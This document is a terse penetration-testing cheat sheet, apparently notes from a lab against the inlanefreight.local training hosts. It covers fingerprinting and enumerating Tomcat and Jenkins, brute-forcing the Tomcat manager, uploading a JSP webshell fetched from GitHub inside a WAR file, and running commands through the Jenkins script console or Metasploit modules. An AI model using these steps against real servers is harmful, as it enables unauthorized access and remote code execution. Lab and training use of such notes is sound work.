## Tomcat Fingerprinting
http://app-dev.inlanefreight.local:8080/invalid

curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

## Tomcat Enumeration
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 

## Tomcat Manager - Login Brute Force
auxiliary/scanner/http/tomcat_mgr_login

## Tomcat Code Execution via WAR File Upload
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

zip -r backup.war cmd.jsp 

http://web01.inlanefreight.local:8180/manager/html

curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

## Tomcat Code Execution via Leveraging Known Vulnerabilities
Check web for CVEs sooner than the version

## Jenkins Fingerprinting
Cant see version without logging in.

admin:admin => find About page => version

## Jenkins Code Execution via Script Console
http://jenkins.inlanefreight.local:8000/script

or

msfconsole exploit/multi/http/jenkins_script_console

## Jenkins Code Execution via Leveraging Known Vulnerabilities
Check web for CVEs sooner than the version